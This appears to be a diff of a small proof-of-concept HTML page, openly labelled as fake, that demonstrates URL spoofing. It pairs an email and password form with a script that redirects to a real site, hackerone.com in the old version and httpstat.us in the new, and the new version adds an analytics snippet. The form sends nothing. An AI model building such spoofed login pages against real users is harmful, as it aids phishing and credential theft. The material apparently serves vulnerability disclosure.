@@ -1,14 +1,21 @@
-<html>
-<title>I'm not real Hackerone page</title>
-<h1> This is Not Hackerone, this is just to demonstrate url spoofing, I'm not real.</h1>
+<html><head><title>I&#39;m not real page</title>
+        <script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+            ga('create', 'UA-75065234-3', 'auto');
+            ga('send', 'pageview', '/demulcentsubstance.html');
+        </script></head><body><h1> This is Not httpstat.us, this is just to demonstrate url spoofing, I&#39;m not real.</h1>
 <form>
-Enter your Email: <input type="text" name="username" placeholder="email"><br>
-Enter your Password: <input type="text" name="password" placeholder="pass">
+Enter your Email: <input type="text" name="username" placeholder="email"/><br/>
+Enter your Password: <input type="text" name="password" placeholder="pass"/>
 <script>
 function spoof()
 {
-location.assign("https://www.hackerone.com");
+location.replace("https://httpstat.us/204");
 }
-setInterval("spoof()", 5);
+setTimeout("spoof()", 50);
 </script>
-</html>
+</form></body></html>
